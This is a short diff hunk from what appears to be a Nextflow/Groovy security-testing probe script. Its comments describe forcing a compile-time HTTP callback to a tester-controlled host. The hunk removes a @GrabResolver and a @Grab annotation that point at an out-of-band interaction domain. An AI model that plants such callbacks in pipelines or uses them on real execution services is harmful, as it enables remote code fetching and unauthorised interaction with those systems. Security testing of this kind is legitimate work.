@@ -16,8 +16,6 @@ nextflow.enable.dsl=2
 
 // ================= COMPILE-TIME (Grape dependency resolution -> outbound to YOUR host) =================
 // Forces Groovy Grape to fetch an artifact from a resolver you control = compile-time HTTP callback.
-@GrabResolver(name='probe', root='http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/')
-@Grab(group='probe', module='probe', version='1.0')
 import java.net.InetAddress
 
 // ================= SCRIPT-EVAL PHASE (compile / -preview / -stub / DSL evaluation) =================
